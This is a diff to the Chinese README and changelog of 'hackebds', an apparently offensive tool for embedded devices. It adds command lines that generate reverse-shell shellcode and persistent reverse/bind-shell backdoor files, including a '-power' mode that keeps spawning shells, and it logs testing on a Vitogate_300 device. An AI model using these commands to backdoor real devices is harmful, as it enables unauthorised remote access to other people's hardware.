@@ -86,6 +86,8 @@ hackebds -reverse_ip 127.0.0.1 -reverse_port 9999 -model DIR-816 -res reverse_sh
 
    ```
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shellcode
+   or
+   hackebds -lhost 127.0.0.1 -lport 9999 -arch mipsel -res reverse_shellcode
    ```
 
 ![image-20221102181217933](https://img-blog.csdnimg.cn/img_convert/8571f33df56a35983e368c777141ad54.png)
@@ -97,12 +99,16 @@ hackebds -reverse_ip 127.0.0.1 -reverse_port 9999 -model DIR-816 -res reverse_sh
 
 ```
 hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash
+or 
+hackebds -lhost 127.0.0.1 -lport 8081 -arch armelv7 -res reverse_shell_file -shell bash
 ```
 
 ​	如果需要生成后门不断地创建反向shell（测试占用CPU大概是%8左右）
 
 ```
 hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash -power
+or
+hackebds -lhost 127.0.0.1 -lport 8081 -arch armelv7 -res reverse_shell_file -shell bash -power
 ```
 
 ​	如果需要每5秒创建一次反向shell
@@ -371,6 +377,8 @@ Powerpc, sparc: qemu
 2023.3.7 0.3.6 加入了针对于mipsn32架构的支持（此架构在zyxel防火墙等设备中可能会遇到）
 
 2023.5.30 0.3.7 加入对CVE的检索，添加设备信息中的EXP，POC文件内容输出，更新armelv5的反向shell文件后门代码，加入-sleep参数针对反向shell的创建间隔
+
+2023.11.11 彻底修复了armv5系列设备反弹shell与bindshell的后门文件，在Vitogate_300均测试成功，将命令行参数简化-reverse_ip/-lhost -reverse_port/-lport 等，加入了一些设备信息与漏洞信息
 
 
 
